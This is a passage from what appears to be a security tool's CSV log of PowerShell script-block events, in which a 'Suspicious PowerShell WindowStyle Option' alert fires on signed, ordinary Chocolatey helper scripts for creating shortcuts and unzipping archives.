HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: 7bc11748-ac2b-44dc-ab9d-bc934fe384e4 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:48.999 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,82,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = 